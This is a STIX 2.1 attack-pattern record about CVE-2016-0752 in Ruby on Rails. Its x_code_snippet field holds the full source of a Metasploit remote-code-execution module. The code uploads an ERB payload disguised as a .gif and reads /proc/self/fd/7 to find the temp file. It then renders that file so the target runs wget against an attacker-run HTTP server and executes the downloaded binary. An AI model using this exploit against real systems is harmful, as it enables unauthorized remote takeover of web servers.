{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11931784-1873-424c-a614-252154edee67",
    "created": "2024-08-14T17:10:35.190577Z",
    "modified": "2024-08-14T17:10:35.190581Z",
    "name": "Ruby on Rails Dynamic Render File Upload Remote Code Execution",
    "description": " This module exploits a remote code execution vulnerability in the explicit render method when leveraging user parameters. This module has been tested across multiple versions of Ruby on Rails. The technique used by this module requires the specified endpoint to be using dynamic render paths, such as the following example:  def show render params[:id] end  Also, the vulnerable target will need a POST endpoint for the TempFile upload, this can literally be any endpoint. This module doesnt use the log inclusion method of exploitation due to it not being universal enough. Instead, a new code injection technique was found and used whereby an attacker can upload temporary image files against any POST endpoint and use them for the inclusion attack. Finally, you only get one shot at this if you are testing with the builtin rails server, use caution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_dynamic_render_code_exec.rb",
            "external_id": "rails_dynamic_render_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0752"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails Dynamic Render File Upload Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a remote code execution vulnerability in the explicit render\n        method when leveraging user parameters.\n        This module has been tested across multiple versions of Ruby on Rails.\n        The technique used by this module requires the specified\n        endpoint to be using dynamic render paths, such as the following example:\n\n        def show\n          render params[:id]\n        end\n\n        Also, the vulnerable target will need a POST endpoint for the TempFile upload, this\n        can literally be any endpoint. This module doesnt use the log inclusion method of\n        exploitation due to it not being universal enough. Instead, a new code injection\n        technique was found and used whereby an attacker can upload temporary image files\n        against any POST endpoint and use them for the inclusion attack. Finally, you only\n        get one shot at this if you are testing with the builtin rails server, use caution.\n      },\n      'Author'         =>\n        [\n          'mr_me <mr_me@offensive-security.com>',      # necromanced old bug & discovered new vector rce vector\n          'John Poulin (forced-request)'               # original render bug finder\n        ],\n      'References'  =>\n        [\n          [ 'CVE', '2016-0752'],\n          [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/335P1DcLG00'],        # rails patch\n          [ 'URL', 'https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/'],  # John Poulin CVE-2016-0752 patched in 5.0.0.beta1.1 - January 25, 2016\n          [ 'URL', 'https://gist.github.com/forced-request/5158759a6418e6376afb'],                     # John's original exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'    => ['linux', 'bsd'],\n      'Arch'        => ARCH_X86,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n        },\n      'Privileged'     => false,\n      'Targets'     =>\n        [\n          [ 'Ruby on Rails 4.0.8 July 2, 2014', {} ]                                                   # Other versions are also affected\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2016-10-16'))\n    register_options(\n      [\n        Opt::RPORT(3000),\n        OptString.new('URIPATH', [ true, 'The path to the vulnerable route', \"/users\"]),\n        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 1337 ]),\n      ])\n  end\n\n  def check\n\n    # this is the check for the dev environment\n    res = send_request_cgi({\n      'uri'       =>  normalize_uri(datastore['URIPATH'], \"%2f\"),\n      'method'    =>  'GET',\n    }, 60)\n\n    # if the page controller is dynamically rendering, its for sure vuln\n    if res and res.body =~ /render params/\n      return CheckCode::Vulnerable\n    end\n\n    # this is the check for the prod environment\n    res = send_request_cgi({\n      'uri'       =>  normalize_uri(datastore['URIPATH'], \"%2fproc%2fself%2fcomm\"),\n      'method'    =>  'GET',\n    }, 60)\n\n    # if we can read files, its likley we can execute code\n    if res and res.body =~ /ruby/\n      return CheckCode::Appears\n    end\n    return CheckCode::Safe\n  end\n\n  def on_request_uri(cli, request)\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def send_payload\n    @bd = rand_text_alpha(8+rand(8))\n    fn  = rand_text_alpha(8+rand(8))\n    un  = rand_text_alpha(8+rand(8))\n    pn  = rand_text_alpha(8+rand(8))\n    register_file_for_cleanup(\"/tmp/#{@bd}\")\n    cmd  = \"wget #{@service_url} -O /tmp/#{@bd};\"\n    cmd << \"chmod 755 /tmp/#{@bd};\"\n    cmd << \"/tmp/#{@bd}\"\n    pay = \"<%=`#{cmd}`%>\"\n    print_status(\"uploading image...\")\n    data = Rex::MIME::Message.new\n    data.add_part(pay, nil, nil, 'form-data; name=\"#{un}\"; filename=\"#{fn}.gif\"')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'cookie' => @cookie,\n      'uri'    => normalize_uri(datastore['URIPATH'], pn),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => data.to_s\n    })\n    if res and res.code == 422 and res.body =~ /Tempfile:\\/(.*)&gt;/\n      @path = \"#{$1}\" if res.body =~ /Tempfile:\\/(.*)&gt;/\n      return true\n    else\n\n      # this is where we pull the log file\n      if leak_log\n        return true\n      end\n    end\n    return false\n  end\n\n  def leak_log\n\n    # path to the log /proc/self/fd/7\n    # this bypasses the extension check\n    res = send_request_cgi({\n      'uri'       =>  normalize_uri(datastore['URIPATH'], \"proc%2fself%2ffd%2f7\"),\n      'method'    =>  'GET',\n    }, 60)\n\n    if res and res.code == 200 and res.body =~ /Tempfile:\\/(.*)>, @original_filename=/\n      @path = \"#{$1}\" if res.body =~ /Tempfile:\\/(.*)>, @original_filename=/\n      return true\n    end\n    return false\n  end\n\n  def start_http_server\n    @pl = generate_payload_exe\n    @elf_sent = false\n    downfile = rand_text_alpha(8+rand(8))\n    resource_uri = '/' + downfile\n    if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n      srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)\n    else\n      srv_host = datastore['SRVHOST']\n    end\n\n    # do not use SSL for the attacking web server\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    @service_url = \"http://#{srv_host}:#{datastore['SRVPORT']}#{resource_uri}\"\n    service_url_payload = srv_host + resource_uri\n    print_status(\"#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...\")\n    start_service({'Uri' => {\n      'Proc' => Proc.new { |cli, req|\n        on_request_uri(cli, req)\n      },\n      'Path' => resource_uri\n    }})\n    datastore['SSL'] = true if ssl_restore\n    connect\n  end\n\n  def render_tmpfile\n    @path.gsub!(/\\//, '%2f')\n    res = send_request_cgi({\n      'uri'       =>  normalize_uri(datastore['URIPATH'], @path),\n      'method'    =>  'GET',\n    }, 1)\n  end\n\n  def exploit\n      print_status(\"Sending initial request to detect exploitability\")\n      start_http_server\n      if send_payload\n        print_good(\"injected payload\")\n        render_tmpfile\n\n        # we need to delay, for the stager\n        select(nil, nil, nil, 5)\n      end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-16",
    "x_mitre_platforms": [
        "['linux', 'bsd']"
    ]
}